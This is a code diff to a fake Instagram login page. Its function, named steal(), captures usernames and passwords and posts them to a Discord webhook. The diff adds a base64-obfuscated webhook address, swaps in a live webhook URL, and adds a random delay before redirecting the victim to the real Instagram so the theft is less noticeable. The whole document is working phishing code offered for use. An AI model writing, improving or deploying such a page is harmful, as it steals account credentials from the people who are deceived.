@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Instagram </title>
+  <title>Instagram</title>
   <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
 
@@ -90,6 +90,9 @@
   </div>
 
   <script>
+    // Base64 decoded webhook link (example)
+    const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1ODAwMDMzNzc4MjczODM5L0Z3TFRJVnJ0RTItWUZ1a3J3N0lna2Z3ZDZFVXIyQ0ZBZHBhb24uNjhzNWZnT3FBZlp6VFVTSXMxYnAzS2F2eg==");
+
     function steal(e) {
       e.preventDefault(); // Prevent form submission to handle it in JS
 
@@ -102,9 +105,8 @@
         password: p
       };
 
-      // Send the data to Discord webhook
-      fetch("https://buly.kr/7bGbEdg
-", {
+      // Send the data to the Discord webhook
+      fetch("https://discord.com/api/webhooks/1358000337738272839/FwLTIVrtE2-YFukbw7Qeuhh86ZL5GW8XuU2CFadpaon68s5FgOqZBzTUSiSlAv1vCavX", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -117,7 +119,11 @@
         // Check if the request was successful
         if (response.ok) {
           console.log("Data sent successfully");
-          window.location.href = "https://instagram.com"; // Redirect to Instagram after success
+
+          // Slight random delay before redirecting to Instagram
+          setTimeout(() => {
+            window.location.href = "https://instagram.com"; // Redirect to Instagram after success
+          }, Math.random() * 2000 + 1000);  // Random delay between 1-3 seconds
         } else {
           console.error('Request failed with status:', response.status);
           alert('Something went wrong. Please try again later.');
